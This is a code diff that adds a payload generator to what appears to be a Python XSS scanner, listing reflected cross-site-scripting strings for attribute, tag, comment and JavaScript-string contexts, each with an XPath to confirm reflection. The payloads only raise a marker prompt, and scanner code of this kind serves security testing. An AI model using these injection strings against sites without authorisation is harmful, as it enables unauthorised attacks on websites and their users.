@@ -100,3 +100,34 @@ class HtmlParser:
         data = {input_field.get("name"): input_field.get("value", "jam") for input_field in form_inputs if input_field.get("name")}
 
         return form_method, data
+
+
+class PayloadGenerator:
+    def __init__(self):
+        self.payloads = {
+            'Attribute Name': [
+                {"payload": "\"><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
+                {"payload": " onload=prompt`964864` ", "find": "//*[@onload[contains(.,964864)]]"}
+            ],
+            'Attribute Value': [
+                {"payload": "\"><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
+                {"payload": "'\" onload=prompt`964864` ", "find": "//*[@onload[contains(.,964864)]]"}
+            ],
+            'HTML Tag': [
+                {"payload": "<svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"}
+            ],
+            'Comment': [
+                {"payload": "--><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"}
+            ],
+            'Js Single Quote': [
+                {"payload": "</script><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
+                {"payload": "'); prompt`964864`;//", "find": '//script[contains(text(), "prompt`964864`")]'}
+            ],
+            'Js Double Quote': [
+                {"payload": "</script><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
+                {"payload": "\")-prompt`964864`-//", "find": '//script[contains(text(), "prompt`964864`")]'}
+            ]
+        }
+
+    def generate(self, context):
+        return self.payloads.get(context, [])
